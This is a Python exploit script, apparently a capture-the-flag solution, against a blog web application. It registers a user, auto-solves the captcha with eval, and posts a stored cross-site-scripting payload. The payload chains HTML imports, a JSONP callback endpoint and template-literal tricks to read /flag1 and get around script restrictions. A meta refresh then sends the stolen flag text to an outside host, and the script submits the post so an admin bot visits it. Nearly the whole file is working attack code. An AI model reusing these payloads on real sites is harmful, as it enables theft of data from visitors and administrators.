#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import sys
import string
import random
import urllib
import requests


def randstr(n):
    return ''.join(random.choice(string.ascii_letters) for _ in range(n))


def solve_captcha(body):
    captcha = body.split('What is ')[1].split('?')[0].replace(' ', '')
    assert all(c in '0123456789+-' for c in captcha)
    return eval(captcha)


def contact(postid):
    r = s.get(url + '/contact')
    r = s.post(url + '/contact',
               data={'postid': postid,
                     'csrfmiddlewaretoken': s.cookies['csrftoken'],
                     'captcha_answer': solve_captcha(r.text)})


def register(user, pw):
    s.get(url+'/')
    s.post(url + '/signup/', data={
        'username': user,
        'password1': pw,
        'password2': pw,
        'csrfmiddlewaretoken': s.cookies['csrftoken'],
    })


def publish(content):
    r = s.get(url+'/')
    r = s.post(url+'/publish', data={
        'title': 'hi',
        'post': content,
        'csrfmiddlewaretoken': s.cookies['csrftoken'],
        'captcha_answer': solve_captcha(r.text),
    })


def getposts():
    return re.findall(r'/post/([0-9a-f-]{36})', s.get(url+'/').text)


def script(cb):
    return '<script src="/feed?type=jsonp&cb=%s"></script>' % urllib.quote(cb)


# for blog 2 import

url = 'http://35.197.245.102'
s = requests.Session()

user = randstr(10)
pw = "123asdzxc"
register(user, pw)


if __name__ == '__main__':

    call1 = script('shit.append`${woot.import.getElementsByTagName`p`.item``.textContent.trim``}`')
    call2 = script('shit.append`${rest.textContent}`')
    call3 = script('document.write`${shit.textContent}`')

    publish('''
    <link id="woot" rel="import" href="/flag1">
    <textarea id="shit">
    <meta http-equiv="refresh" content="0;url='{xssurl}</textarea>
    <textarea id="rest">'"></textarea>
    {call1}
    {call2}
    {call3}
    '''.format(
        xssurl="http://you.xss.com/",
        call1=call1,
        call2=call2,
        call3=call3))

    payloadpost = getposts()[0]
    print('http://localhost:1342/post/%s' % payloadpost)

    contact(payloadpost)
